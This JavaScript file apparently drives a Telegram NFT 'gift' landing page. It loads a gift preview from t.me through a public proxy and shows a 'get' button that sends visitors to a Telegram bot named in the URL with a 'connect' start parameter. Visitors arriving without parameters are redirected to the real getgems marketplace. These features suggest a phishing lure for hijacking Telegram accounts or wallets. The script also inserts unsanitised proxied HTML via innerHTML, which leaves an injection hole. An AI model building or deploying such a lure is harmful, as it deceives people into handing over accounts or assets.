async function loadNFT() {
    const params = new URLSearchParams(window.location.search);
    const giftUrl = params.get('gift');
    const botUsername = params.get('bot');

    if (!giftUrl) {
        window.location.href = 'https://getgems.io/';
        return;
    }

    if (!botUsername) {
        window.location.href = 'https://getgems.io/';
        return;
    }

    if (!giftUrl.startsWith('https://t.me/')) {
        document.getElementById('preview').innerHTML = '<div class="error-message">Некорректная ссылка.</div>';
        document.getElementById('result').innerHTML = '';
        return;
    }

    const proxy = 'https://api.allorigins.win/raw?url=';

    try {
        const res = await fetch(proxy + giftUrl);
        if (!res.ok) throw new Error('Network error');

        const html = await res.text();
        const doc = new DOMParser().parseFromString(html, 'text/html');

        const previewEl = document.getElementById('preview');
        previewEl.innerHTML = '';

        // Create background container
        const bgDiv = document.createElement('div');
        bgDiv.className = 'nft_background';
        
        const gift = doc.querySelector('.tgme_gift_preview');
        const svg = gift?.querySelector('svg');
        if (svg) {
            bgDiv.innerHTML = svg.outerHTML;
        }
        
        previewEl.appendChild(bgDiv);

        // Create sticker container
        const source = doc.querySelector('source[type="application/x-tgsticker"]');
        const tgsUrl = source?.srcset?.split(',')[0]?.trim();
        if (tgsUrl) {
            const stickerDiv = document.createElement('div');
            stickerDiv.className = 'nft_sticker';
            stickerDiv.innerHTML = `<tgs-player src="${tgsUrl}" autoplay loop></tgs-player>`;
            previewEl.appendChild(stickerDiv);
        }

        document.getElementById('telegram-btn').href = giftUrl;
        const shareLink = `tg://msg_url?text=Check out this gift!&url=${giftUrl}`;
        document.getElementById('share-btn').href = shareLink;

        const attrs = { Model: 'Model', Backdrop: 'Backdrop', Symbol: 'Symbol' };
        const cells = [...doc.querySelectorAll('td, th')];
        const out = [];

        for (let eng in attrs) {
            const cell = cells.find(c => c.textContent.trim().startsWith(eng));
            const val = cell?.nextElementSibling?.innerHTML.trim() || '—';
            out.push({ label: attrs[eng], value: val });
        }

        const resultEl = document.getElementById('result');
        resultEl.innerHTML = out.map(f => `
            <div class="field">
                <div class="label">${f.label}</div>
                <div class="value"><mark>${f.value}</mark></div>
            </div>
        `).join('');

    } catch (error) {
        console.error('Error loading NFT:', error);
        document.getElementById('preview').innerHTML = '<div class="error-message">Ошибка загрузки NFT.</div>';
        document.getElementById('result').innerHTML = '';
    }
}


document.querySelector('.btn.get').addEventListener('click', () => {
    const params = new URLSearchParams(window.location.search);
    const botUsername = params.get('bot');
    if (!botUsername) return;

    const modal = document.getElementById('gift-modal');
    const openBotLink = document.getElementById('open-bot-link');

    openBotLink.href = `https://t.me/${botUsername}?start=connect`;
    modal.style.display = 'flex';
});

document.querySelector('.close-icon').addEventListener('click', () => {
    document.getElementById('gift-modal').style.display = 'none';
});

function checkCSSLoaded() {
    const testEl = document.createElement('div');
    testEl.className = 'btn';
    testEl.style.display = 'none';
    document.body.appendChild(testEl);

    const computedStyle = getComputedStyle(testEl);
    const isCSSLoaded = computedStyle.borderRadius !== '' && computedStyle.borderRadius !== '0px';

    if (!isCSSLoaded) {
        alert('Ошибка: перезапустите страницу.');
        console.warn('CSS not loaded or failed to apply.');
    }

    document.body.removeChild(testEl);
}



loadNFT();
checkCSSLoaded();